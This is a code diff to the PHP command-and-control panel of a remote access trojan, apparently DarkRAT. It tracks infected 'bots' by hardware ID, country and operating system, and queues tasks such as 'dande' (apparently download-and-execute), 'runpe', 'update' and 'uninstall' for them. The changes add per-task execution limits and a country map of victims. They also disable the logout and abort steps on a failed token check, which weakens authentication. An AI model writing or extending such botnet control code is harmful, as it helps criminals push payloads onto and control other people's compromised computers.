@@ -11,21 +11,23 @@ class Main{
             $result = $statement->execute(array($identifier));
             $securitytoken_row = $statement->fetch();
 
-            if(sha1($securitytoken) !== $securitytoken_row['securitytoken']) {
-                //TODO Log Bruteforce?
-                setcookie("identifier","",time()-(3600*24*365));
-                setcookie("securitytoken","",time()-(3600*24*365));
-                die('UPS: An error by Checking your Authentication');
-            } else { //Token war korrekt
-                //Setze neuen Token
-                $neuer_securitytoken = $this->random_string();
-                $insert = $GLOBALS["pdo"]->prepare("UPDATE securitytokens SET securitytoken = :securitytoken WHERE identifier = :identifier");
-                $insert->execute(array('securitytoken' => sha1($neuer_securitytoken), 'identifier' => $identifier));
-                setcookie("identifier",$identifier,time()+(3600*24*365)); //1 Jahr Gültigkeit
-                setcookie("securitytoken",$neuer_securitytoken,time()+(3600*24*365)); //1 Jahr Gültigkeit
+            if(!empty($securitytoken)){
+                if(sha1($securitytoken) !== $securitytoken_row['securitytoken']) {
+                    //TODO Log Bruteforce?
+                    //setcookie("identifier","",time()-(3600*24*365));
+                    //setcookie("securitytoken","",time()-(3600*24*365));
+                   // die('UPS: An error by Checking your Authentication');
+                } else { //Token war korrekt
+                    //Setze neuen Token
+                    $neuer_securitytoken = $this->random_string();
+                    $insert = $GLOBALS["pdo"]->prepare("UPDATE securitytokens SET securitytoken = :securitytoken WHERE identifier = :identifier");
+                    $insert->execute(array('securitytoken' => sha1($neuer_securitytoken), 'identifier' => $identifier));
+                    setcookie("identifier",$identifier,time()+(3600*24*365)); //1 Jahr Gültigkeit
+                    setcookie("securitytoken",$neuer_securitytoken,time()+(3600*24*365)); //1 Jahr Gültigkeit
 
-                //Logge den Benutzer ein
-                $_SESSION['darkrat_userid'] = $securitytoken_row['user_id'];
+                    //Logge den Benutzer ein
+                    $_SESSION['darkrat_userid'] = $securitytoken_row['user_id'];
+                }
             }
         }
     }
@@ -194,15 +196,19 @@ class Main{
                 if(!empty($_POST["netFramwork-filter"])){
                     $filter["netFramwork"] = implode(', ', $_POST['netFramwork-filter']);
                 }
+                $exectionLimit = 0;
+                if(!empty($_POST["limit"])){
+                    $exectionLimit = $_POST["limit"];
+                }
                 if($_POST["task"] == "uninstall") {
-                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
-                    $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"]));
+                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
+                    $statement->execute(array(json_encode($filter), 1, 'uninstall', $_POST["task"], $exectionLimit));
                 } elseif($_POST["task"] == "dande" || $_POST["task"] == "update" || $_POST["task"] == "runpe") {
                     if(empty($_POST["command"])){
                         die("Please Input a Command");
                     }
-                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task) VALUES (?, ?, ?, ?)");
-                    $statement->execute(array(json_encode($filter), 1, $_POST["command"], $_POST["task"]));
+                    $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, command, task, execution_limit) VALUES (?, ?, ?, ?, ?)");
+                    $statement->execute(array(json_encode($filter), 1, $_POST["command"], $_POST["task"], $exectionLimit));
                 }
                 header("refresh: 0");
             }
@@ -280,21 +286,19 @@ class Main{
             $sql = "SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
             LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
             LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
-            WHERE tasks_completed.taskid = ?";
+            WHERE tasks_completed.taskid = ? group by bothwid";
             $tasks = array();
             $statement =  $GLOBALS["pdo"]->prepare($sql);
             $statement->execute(array($id));
-            $worldmap = array();
             while($row = $statement->fetch(PDO::FETCH_ASSOC)) {
                 $tasks[] = $row;
+            }
+            $worldmap = array();
+            $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
+            foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                 $worldmap[ strtolower( $this->countryMap($row["country"]))] = intval ($row["NUM"]);
             }
-            $countries = array();
-            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
-                $countries[] = $row["country"];
-            }
             $GLOBALS["tpl"]->assign("tasks", $tasks);
-            $GLOBALS["tpl"]->assign("countries", $countries);
             $GLOBALS["tpl"]->assign("worldmap", json_encode($worldmap));
         }
 
